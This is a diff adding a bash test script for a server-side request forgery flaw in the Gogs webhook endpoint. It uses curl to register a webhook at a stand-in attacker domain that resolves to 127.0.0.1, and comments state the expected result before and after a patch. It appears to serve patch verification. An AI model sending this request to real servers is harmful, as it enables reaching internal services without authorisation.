@@ -1,0 +1,16 @@
+#!/bin/bash
+# SSRF Test Case for Gogs webhook endpoint (CWE-918)
+
+# Prerequisites:
+# - Authenticated user with webhook creation rights on a repo
+# - Attacker controls DNS record for ssrf.attacker.com, resolving to 127.0.0.1
+
+# Attempt to create a webhook to internal IP via DNS trick
+curl -i -X POST http://your-gogs-server/user/repo/settings/hooks/git \
+  -H "Content-Type: application/x-www-form-urlencoded" \
+  -H "Cookie: YOUR_AUTH_COOKIE" \
+  --data-urlencode "url=http://ssrf.attacker.com/webhook"
+
+# Expected:
+# - BEFORE patch: Gogs accepts the webhook and sends HTTP request to 127.0.0.1
+# - AFTER patch: Gogs rejects the webhook creation with a 400 error due to internal IP resolution
